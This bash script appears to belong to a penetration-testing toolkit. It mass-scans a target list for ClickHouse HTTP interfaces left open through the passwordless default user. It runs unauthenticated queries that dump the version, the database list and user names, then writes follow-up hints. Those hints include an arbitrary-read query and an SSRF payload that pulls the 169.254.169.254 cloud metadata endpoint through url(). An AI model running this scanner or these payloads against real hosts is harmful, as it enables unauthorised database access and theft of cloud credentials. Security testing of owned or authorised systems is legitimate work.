#!/usr/bin/env bash
# enum-clickhouse.sh — ClickHouse HTTP interface enumeration.
#
# ClickHouse ships with a `default` user that has NO password out of the box, so
# the 8123 HTTP interface commonly answers arbitrary SQL unauthenticated —
# SHOW DATABASES, SELECT from system tables, and (with file()/url() table
# functions) SSRF / local file read.
#
# READ-ONLY: only SELECT / SHOW queries. No INSERT/CREATE/DROP.

set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"
parse_common_args "$@" || exit 1
log "clickhouse: $(wc -l < "$TARGETS") targets -> $OUT"

if ! have curl; then
    miss "curl not installed — clickhouse dispatcher cannot probe"
    exit 0
fi

urlenc() { local s="$1" o="" c i
    for (( i=0; i<${#s}; i++ )); do c="${s:$i:1}"
        case "$c" in [a-zA-Z0-9.~_-]) o+="$c" ;; *) o+=$(printf '%%%02X' "'$c") ;; esac
    done
    printf '%s' "$o"
}

while read -r target; do
    [ -z "$target" ] && continue
    read -r ip port <<< "$(split_ipport "$target")"
    h="$ip"; [[ "$ip" == *:* ]] && h="[$ip]"
    out_dir="$OUT/${ip}_${port}"; mkdir -p "$out_dir"

    for scheme in http https; do
        base="${scheme}://${h}:${port}"
        # /ping returns "Ok.\n" on a live ClickHouse HTTP interface.
        ping=$(curl -ks --connect-timeout 5 --max-time 10 "$base/ping" 2>/dev/null)
        [ -z "$ping" ] && continue
        printf '%s\n' "$ping" | grep -qi '^Ok\.' || continue
        hit "ClickHouse HTTP interface alive at $base"

        # Version (also confirms unauth query execution as the default user).
        q=$(urlenc "SELECT version()")
        curl -ks --connect-timeout 5 --max-time 10 "$base/?query=$q" \
            > "$out_dir/version_${scheme}.txt" 2>/dev/null || true

        q=$(urlenc "SHOW DATABASES")
        curl -ks --connect-timeout 5 --max-time 15 "$base/?query=$q" \
            > "$out_dir/databases_${scheme}.txt" 2>/dev/null || true

        if [ -s "$out_dir/databases_${scheme}.txt" ] \
           && ! grep -qi 'Authentication failed\|Code: 516\|DB::Exception.*password' "$out_dir/databases_${scheme}.txt"; then
            err "CRITICAL: UNAUTH ClickHouse SQL on $base — SHOW DATABASES returned data (default user, no password)"
            # Users table (may reveal other accounts / grants).
            q=$(urlenc "SELECT name FROM system.users")
            curl -ks --connect-timeout 5 --max-time 10 "$base/?query=$q" \
                > "$out_dir/users_${scheme}.txt" 2>/dev/null || true
        fi
    done
done < "$TARGETS"

cat > "$OUT/_hints.txt" <<'EOF'
ClickHouse follow-ups:
  * Unauth SQL on the default user is arbitrary read across every database:
      curl 'http://<ip>:8123/?query=SELECT+*+FROM+system.tables'
  * file()/url()/s3() table functions enable SSRF and local file read:
      SELECT * FROM url('http://169.254.169.254/latest/meta-data/','LineAsString')
  * Check system.users / system.grants for credentialed accounts and
    system.settings for allow_introspection_functions (memory read).
EOF

log "clickhouse dispatcher done."
